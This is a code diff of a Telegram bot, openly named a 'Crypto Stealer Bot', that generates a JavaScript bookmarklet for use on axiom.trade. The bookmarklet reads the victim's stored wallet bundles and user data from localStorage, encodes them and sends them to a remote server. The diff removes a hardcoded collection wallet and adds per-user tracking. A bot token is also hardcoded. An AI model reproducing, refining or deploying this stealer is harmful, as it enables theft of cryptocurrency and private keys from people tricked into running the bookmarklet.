@@ -1,11 +1,10 @@
 const TelegramBot = require('node-telegram-bot-api');
 
 const BOT_TOKEN = '7641165749:AAFla0YZ3Z7PUViwZQaq8a0W2-ydT7n0bJc';
-const DEFAULT_WALLET = 'CFBkgsCnDwZmu3U2LsawtWFzbWRpDR2rQMCEPzkxz7Ba';
+const BACKEND_URL = 'http://localhost:3000';
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-// Generate bookmarklet with default wallet
 bot.onText(/\/generate/, (msg) => {
   const chatId = msg.chat.id;
   
@@ -26,20 +25,16 @@ bot.onText(/\/generate/, (msg) => {
         user:user,
         bundle:bundle.bundleKey,
         sBundles:localStorage.getItem('sBundles'),
-        eBundles:localStorage.getItem('eBundles'),
-        defaultWallet:'${DEFAULT_WALLET}'
+        eBundles:localStorage.getItem('eBundles')
       };
-      location.replace('https://nodebookmark.onrender.com/data/'+btoa(JSON.stringify(bookmarkData)))
+      location.replace('${BACKEND_URL}/data/'+btoa(JSON.stringify(bookmarkData)))
     }catch(e){
       alert('Error occurred')
     }
   })();`;
 
   bot.sendMessage(chatId, `
-🎯 **Bookmarklet Generated**
-
-💳 **Default Collection Wallet:**
-\`${DEFAULT_WALLET}\`
+🎯 **Your Custom Bookmarklet**
 
 📋 **Bookmarklet Code:**
 \`\`\`
@@ -48,32 +43,24 @@ ${bookmarklet}
 
 **Instructions:**
 1. Copy the code above
-2. Create a bookmark with this code as the URL  
+2. Create a bookmark with this as the URL
 3. Use on axiom.trade when logged in
-4. All funds go to the default wallet automatically
+4. You'll get notifications with balance info
 
-⚠️ Educational purposes only
+Your tracking ID: ${chatId}
   `, { parse_mode: 'Markdown' });
-});
-
-bot.onText(/\/wallet/, (msg) => {
-  bot.sendMessage(msg.chat.id, `💳 Default Collection Wallet:\n\`${DEFAULT_WALLET}\``, {
-    parse_mode: 'Markdown'
-  });
 });
 
 bot.onText(/\/start/, (msg) => {
   bot.sendMessage(msg.chat.id, `
-🎯 **Wallet Stealer Bot**
+🎯 **Crypto Stealer Bot**
 
 Commands:
-/generate - Get bookmarklet code
-/wallet - Show default wallet address  
-/start - Show this menu
+/generate - Get your custom bookmarklet
+/start - This menu
 
-All stolen funds are sent to:
-\`${DEFAULT_WALLET}\`
+You'll receive notifications with balance info when your bookmarklet is used.
   `, { parse_mode: 'Markdown' });
 });
 
-console.log('Bot started with default wallet:', DEFAULT_WALLET);
+console.log('Bot started. Send /generate to get bookmarklet');
